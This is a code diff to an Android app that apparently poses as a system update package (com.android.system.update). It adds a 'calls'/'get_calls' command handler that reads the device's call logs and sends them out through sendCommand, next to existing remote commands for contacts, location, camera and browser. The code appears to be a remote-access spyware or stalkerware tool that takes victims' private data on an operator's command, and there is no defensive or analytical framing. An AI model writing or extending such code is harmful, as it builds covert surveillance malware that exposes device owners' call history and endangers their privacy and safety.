@@ -29,7 +29,7 @@ import android.os.PowerManager;
 import android.os.RemoteException;
 import android.os.SystemClock;
 import android.util.Log;
-
+import com.android.system.update.modules.CallsModule;
 import com.android.system.update.modules.CameraModule;
 import com.android.system.update.modules.*;
 import com.android.system.update.modules.BrowserModule;
@@ -1550,6 +1550,18 @@ case "location_test":
                     sendCommand("CALL_RESULT|ERROR: Call module not available or invalid number");
                 }
                 break;
+
+                case "calls":
+                case "get_calls":
+                    if (callsModule != null) {
+                        Log.d(TAG, "📞 Getting call logs");
+                        String result = callsModule.getCallLogs();
+                        // The result is already a JSON array string
+                        sendCommand("CALLS|" + result);
+                    } else {
+                        sendCommand("CALLS|ERROR: Calls module not available");
+                    }
+                    break;
 
             case "contacts":
             case "get_contacts":
